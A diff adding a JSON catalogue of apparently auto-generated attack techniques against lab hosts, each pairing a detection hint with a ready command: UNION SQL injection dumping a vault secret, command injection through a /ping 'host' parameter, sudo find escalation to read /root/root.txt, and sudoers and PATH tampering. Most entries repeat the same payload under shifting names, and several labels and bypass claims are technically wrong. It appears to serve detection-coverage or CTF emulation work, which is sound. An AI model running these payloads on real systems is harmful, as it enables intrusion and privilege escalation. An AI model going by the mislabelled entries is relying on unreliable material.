@@ -1,0 +1,1422 @@
+{
+  "T1562.900": {
+    "name": "SQLi Union Exfiltration",
+    "description": "Exploit the SQL injection vulnerability in /api/transactions to exfiltrate the secret from the vault table by using a UNION query to return the secret field directly.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual query patterns in PostgreSQL logs, including unexpected column selections and UNION operations."
+      }
+    ],
+    "command": "curl -s -G 'http://172.30.10.10:5000/api/transactions' --data-urlencode \"account_id=1' UNION SELECT 1,secret,1,'m','s' FROM vault--\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.900": {
+    "name": "Encoded SQLi Exfiltration",
+    "description": "Use URL-encoded SQL injection to bypass basic input sanitization and retrieve the secret by leveraging encoded payloads that match the expected data format.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Encoded SQL syntax in request parameters, such as URL-encoded quotes and special characters."
+      }
+    ],
+    "command": "curl -s -G 'http://172.30.10.10:5000/api/transactions' --data-urlencode \"account_id=1' UNION SELECT 1,secret,1,'m','s' FROM vault--\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.901": {
+    "name": "SQLi-Union-Exfil-Transactions",
+    "description": "Use a UNION-based SQL injection on the /api/transactions endpoint to exfiltrate the secret from the vault table by matching the 5 columns in the SELECT statement.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual SQL syntax in HTTP GET request to /api/transactions, including UNION and FROM vault"
+      }
+    ],
+    "command": "curl -s -G 'http://172.30.10.10:5000/api/transactions' --data-urlencode \"account_id=1' UNION SELECT 1,secret,1,'m','s' FROM vault--\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.902": {
+    "name": "Command Injection with Sudo Abuse",
+    "description": "Exploit the existing RCE via the injectable 'host' parameter to execute a sudo command that reads the root flag. This leverages the existing sudo access of the 'ctf' user to bypass privilege restrictions.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Log entry showing 'sudo' command execution with user 'ctf' and access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.903": {
+    "name": "Command Injection via Data URL Encoding",
+    "description": "Exploit the data URL encoding in the GET request to inject arbitrary commands. The existing endpoint /ping is vulnerable to command injection, allowing execution as the 'ctf' user. This leverages the existing endpoint and uses data URL encoding to bypass basic sanitization.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing command injection attempts with semicolons in the 'host' parameter, or unexpected file reads from /home/ctf/user.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;cat /home/ctf/user.txt\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1050.900": {
+    "name": "Abuse Sudo NOPASSWD Rule",
+    "description": "Exploit a sudo NOPASSWD rule to execute privileged commands without authentication, allowing access to the root flag.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Sudo command execution in logs with NOPASSWD flag and access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.904": {
+    "name": "Command Injection with Sudo Abuse",
+    "description": "Exploit the command injection vulnerability in the /ping endpoint to execute a command that leverages sudo to read the root flag. This uses the existing RCE as 'ctf' to escalate privileges and access the root flag.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing 'sudo' commands executed by user 'ctf' with unexpected arguments or access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo\\ find\\ /etc/hostname\\ -exec\\ cat\\ /root/root.txt\\ \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.905": {
+    "name": "Command Injection via Data URL Encoding with Sudo Escalation",
+    "description": "Exploit the injectable 'host' parameter in the /ping endpoint to execute a command that leverages sudo privileges to access the root flag. Uses a data URL to bypass basic sanitization and chain to sudo-find command.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing sudo execution with 'find' command and access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo\\ find\\ /etc/hostname\\ -exec\\ cat\\ /root/root.txt\\ \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.906": {
+    "name": "Command Injection with Sudo NOPASSWD Abuse",
+    "description": "Exploit the sudo NOPASSWD rule to execute privileged commands without password, leveraging the already injectable ping endpoint to chain sudo execution.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "sudo command execution in access logs or process listings"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.907": {
+    "name": "Command Injection with Shell Metacharacters",
+    "description": "Use shell metacharacters to bypass basic input sanitization, allowing the attacker to execute arbitrary commands through the ping endpoint.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual shell expansion patterns in server logs or unexpected output from the ping endpoint"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;$(echo \"\\$(cat /home/ctf/user.txt)\")\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.908": {
+    "name": "Command Injection via URL Fragment",
+    "description": "Exploit the URL fragment to inject commands, bypassing simple URL encoding checks. The fragment is not parsed by the server, allowing command injection without URL encoding.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual command execution in the server logs with fragment-based payload"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping#host=127.0.0.1;id'",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.909": {
+    "name": "Command Injection via Base64 Encoding",
+    "description": "Encode malicious commands in base64 to bypass basic URL encoding filters, then decode them on the server side to execute arbitrary commands.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Base64 encoded strings in HTTP request parameters with subsequent execution in server logs"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode 'host=VGhpcyBpcyBhIHNlY3VyZSByYW5kb20gbmVlZC4='",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.910": {
+    "name": "Sudo NOPASSWD Abuse with Sudoers File Manipulation",
+    "description": "Exploit the NOPASSWD rule in sudoers to run commands as root without password. Modify the sudoers file to add a new NOPASSWD rule for a malicious command that reads the root flag.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual modifications to /etc/sudoers.d/ or unexpected entries in /etc/sudoers with NOPASSWD rules."
+      }
+    ],
+    "command": "echo 'ctf ALL=(root) NOPASSWD: /bin/sh -c \"cat /root/root.txt\"' > /etc/sudoers.d/99-malicious",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.911": {
+    "name": "Sudo NOPASSWD with Command Injection",
+    "description": "Use the existing NOPASSWD rule to run a command that injects a shell command to read the root flag, leveraging the already configured NOPASSWD rule for sudo.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Execution of unexpected commands via sudo with NOPASSWD, potentially leading to root flag access."
+      }
+    ],
+    "command": "sudo /bin/sh -c \"echo 'malicious command' | sudo -i && cat /root/root.txt\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.912": {
+    "name": "Command Injection with Base64 Encoding",
+    "description": "Encodes malicious commands in base64 to bypass simple input sanitization, leveraging the existing /ping endpoint to execute arbitrary commands as user 'ctf'.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs of base64 encoded data being processed by the ping command, or unexpected output from the ping endpoint."
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=$(echo 'id;cat /home/ctf/user.txt' | base64)\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.913": {
+    "name": "Command Injection with URL Fragment and Sudo Escalation",
+    "description": "Uses the URL fragment to inject commands, then leverages sudo permissions to escalate to root and retrieve the root flag.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs of command injection via URL fragments, or unexpected sudo execution in the application logs."
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping#;sudo find /etc/hostname -exec cat /root/root.txt \\;'",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.914": {
+    "name": "Command Injection with Sudo Escalation",
+    "description": "Exploit the command injection vulnerability in the /ping endpoint to execute a sudo command that reads the root flag. This leverages the existing NOPASSWD rule for 'find' to gain access to the root flag.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing 'sudo' command execution with 'find' and access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo\\ find\\ /etc/hostname\\ -exec\\ cat\\ /root/root.txt\\ \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.915": {
+    "name": "EncodedCommandExfiltration",
+    "description": "Use URL-encoded command injection to exfiltrate data by embedding payloads in the host parameter, leveraging the ping endpoint to execute commands and capture the user flag.",
+    "tactics": [
+      "exfiltration"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing unexpected command execution in the ping endpoint with embedded shell commands."
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;cat /home/ctf/user.txt\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "exfiltration"
+  },
+  "T1190.916": {
+    "name": "SudoCommandExfiltration",
+    "description": "Exploit the sudo privilege escalation to exfiltrate the root flag by embedding the sudo command in the host parameter, leveraging the ping endpoint for command execution.",
+    "tactics": [
+      "exfiltration"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing sudo command execution via the ping endpoint with unexpected sudo privileges."
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "exfiltration"
+  },
+  "T1190.917": {
+    "name": "Command Injection with Sudo NOPASSWD",
+    "description": "Exploit the NOPASSWD rule in sudo to execute commands as root without password, leveraging the already injected command to run 'sudo find /etc/hostname -exec cat /root/root.txt \\;'.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "sudo command execution in logs, unexpected access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo\\ find\\ /etc/hostname\\ -exec\\ cat\\ /root/root.txt\\ \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.918": {
+    "name": "Command Injection with Sudo NOPASSWD Abuse",
+    "description": "Exploit the NOPASSWD sudo rule to execute commands as root without password, leveraging the already injectable ping command to chain sudo execution.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "sudo command execution in system logs with unexpected arguments or paths"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.919": {
+    "name": "Command Injection via Data URL Encoding with Sudo Escalation",
+    "description": "Exploit the existing command injection vulnerability in the /ping endpoint to chain sudo execution by injecting a semicolon-separated command that first executes a harmless command to bypass basic filtering, then triggers sudo find to read the root flag.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing sudo execution of find with command injection or unexpected arguments, or the presence of /root/root.txt in output"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;echo 'sudo find /etc/hostname -exec cat /root/root.txt \\;';sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.920": {
+    "name": "Command Injection with Null Byte Bypass",
+    "description": "Injects a null byte to bypass basic input sanitization, allowing command execution with unexpected payload formatting.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unexpected output containing shell command results in server logs or unexpected file contents in response"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;echo;cat /home/ctf/user.txt;echo\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.921": {
+    "name": "Command Injection via Data URL Encoding with Sudo Escalation",
+    "description": "Exploits the existing command injection vulnerability in the /ping endpoint to execute a sudo command that reads the root flag. Uses the existing sudo access to escalate privileges.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Execution of sudo commands in the application logs or unexpected file access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.922": {
+    "name": "Command Injection with Sudo Escalation",
+    "description": "Exploit the command injection vulnerability in the /ping endpoint to execute a command that leverages sudo to read the root flag. This uses the existing sudo permissions for 'find' to access the root flag.",
+    "tactics": [
+      "execution"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs of sudo commands executed by user 'ctf' with the 'find' command and access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo\\ find\\ /etc/hostname\\ -exec\\ cat\\ /root/root.txt\\ \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "execution"
+  },
+  "T1190.923": {
+    "name": "Command Injection with Sudo Misuse via Sudoers File",
+    "description": "Exploit sudo's ability to run find as root by injecting a sudo command into the ping command, leveraging the sudoers file to escalate privileges without knowing the password.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Execution of sudo commands in the web server logs, unexpected file access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.924": {
+    "name": "Command Injection via URL Fragment with Sudo Escalation",
+    "description": "Exploit the command injection vulnerability in the /ping endpoint by embedding a sudo command within a URL fragment, leveraging the existing sudo permissions for 'ctf' to escalate to root.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing sudo command execution with 'ctf' user, and unexpected access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.925": {
+    "name": "Command Injection with Sudo Escalation",
+    "description": "Exploit the command injection vulnerability in the /ping endpoint to execute a sudo command that reads the root flag. This leverages the existing sudo permissions of the 'ctf' user to bypass privilege restrictions.",
+    "tactics": [
+      "execution"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing sudo command execution with 'find' and access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo\\ find\\ /etc/hostname\\ -exec\\ cat\\ /root/root.txt\\ \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "execution"
+  },
+  "T1059.900": {
+    "name": "Command Injection via Data URL Encoding",
+    "description": "Exploit the data URL encoding in the GET request to inject arbitrary commands, leveraging the existing /ping endpoint to execute commands as the 'ctf' user and eventually escalate to root via sudo.",
+    "tactics": [
+      "execution"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing unexpected command execution with sudo privileges, specifically the 'find' command targeting /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "execution"
+  },
+  "T1190.926": {
+    "name": "Command Injection with Sudo NOPASSWD",
+    "description": "Exploit the sudo NOPASSWD rule to execute find as root without password, leveraging the already injectable ping command to trigger the sudo command.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "sudo command execution in system logs, unexpected access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.927": {
+    "name": "Command Injection with Sudo Misuse via Sudoers File",
+    "description": "Exploit the sudo privilege escalation by modifying the sudoers file to allow execution of find as root, then use the ping endpoint to trigger the command injection with the modified sudoers configuration.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual modifications to sudoers files or unexpected sudo commands in logs"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;echo 'ctf ALL=(root) NOPASSWD: /usr/bin/find' > /tmp/sudoers; chmod 0440 /tmp/sudoers; echo 'tmp' > /var/run/sudoers.d/ctf; sudo -H -u root find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.928": {
+    "name": "Sudo NOPASSWD Misuse with Sudoers File Injection",
+    "description": "Exploit the NOPASSWD rule in sudoers to run commands as root without password. The attacker can inject malicious entries into sudoers to execute arbitrary commands. This leverages the existing sudo access to escalate privileges.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual modifications to /etc/sudoers file detected by file integrity monitoring or log analysis."
+      }
+    ],
+    "command": "echo 'Cmnd_Alias ROOT = /bin/cat /root/root.txt' >> /etc/sudoers && sudo -u root cat /root/root.txt",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.929": {
+    "name": "Command Injection with Sudo via Environment Variables",
+    "description": "Use environment variables to pass commands to sudo, bypassing standard sudo restrictions. This exploits the fact that certain environment variables can be used to execute commands with elevated privileges.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unexpected executable files in temporary directories or unusual entries in the PATH environment variable."
+      }
+    ],
+    "command": "export PATH=\"/tmp:$(echo $PATH)\" && echo 'echo root_flag' > /tmp/root_flag && sudo -u root /tmp/root_flag",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.930": {
+    "name": "Command Injection via Host Parameter",
+    "description": "Exploit the injectable 'host' parameter in the /ping endpoint to execute arbitrary commands as the 'ctf' user. This leverages the existing RCE vulnerability to run commands like 'cat' or 'sudo find' to capture the root flag.",
+    "tactics": [
+      "execution"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing unexpected command execution in the 'host' parameter, such as 'sudo find /etc/hostname -exec cat /root/root.txt \\;'"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "execution"
+  },
+  "T1190.931": {
+    "name": "Sudo NOPASSWD Abuser",
+    "description": "Exploit the NOPASSWD sudo rule to execute commands as root without password, allowing access to the root flag.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Sudo command execution without password in system logs (e.g., /var/log/auth.log)"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.932": {
+    "name": "Command Injection with Sudo Misuse via Environment Variables",
+    "description": "Exploit the command injection vulnerability in the /ping endpoint to inject a sudo command by leveraging environment variables. The attacker can manipulate the 'host' parameter to include a crafted command that gets executed with elevated privileges via sudo, exploiting the sudoers file configuration.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Log entries showing sudo execution with the 'find' command and access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.933": {
+    "name": "Command Injection with Sudo Misuse via Environment Variable Chain",
+    "description": "Exploits the environment variable to chain sudo commands, leveraging the existing sudo permissions for 'ctf' to access the root flag without direct sudo execution.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unexpected sudo command in environment variable or execution of find with sudo in HTTP request payload"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;export PATH=/usr/local/sbin:$PATH;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.934": {
+    "name": "Command Injection with Sudo NOPASSWD Abuse",
+    "description": "Exploit the NOPASSWD sudo rule to execute privileged commands without authentication, allowing access to the root flag.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "sudo command execution in access logs or process listings"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.935": {
+    "name": "Command Injection with Environment Variable Exploitation",
+    "description": "Inject malicious commands through environment variables that are passed to the ping command, leveraging potential misconfigurations in the application's handling of environment data.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual environment variable usage or unexpected output in server logs"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;echo \"$(cat /root/root.txt)\"\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.936": {
+    "name": "Command Injection with Sudo Misuse via Environment Variable Chain",
+    "description": "Exploit the existing command injection vulnerability to chain environment variables that trigger sudo privileges, allowing execution of privileged commands without explicit sudo invocation.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unexpected sudo command execution in logs or elevated privileges in process listings"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/.local/bin:$PATH;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.937": {
+    "name": "Command Injection with Sudo Misuse via Environment Variable Chain",
+    "description": "Exploit the environment variable chain to trigger sudo find as root, leveraging the already injected command to chain execution and read the root flag.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual environment variable modifications and sudo command execution in logs"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;export PATH=/tmp;echo 'PATH changed';sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.938": {
+    "name": "Command Injection with Sudo NOPASSWD",
+    "description": "Exploit the NOPASSWD sudo rule to execute privileged commands without password, leveraging the already injected command to chain to sudo find and retrieve the root flag.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Sudo command execution in logs, unexpected access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo\\ find\\ /etc/hostname\\ -exec\\ cat\\ /root/root.txt\\ \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.939": {
+    "name": "Command Injection with Sudo Misuse",
+    "description": "Exploit the sudo NOPASSWD rule for find to access the root flag directly without needing to escalate privileges through other means.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Sudo command execution in access logs or process listings with elevated privileges"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.940": {
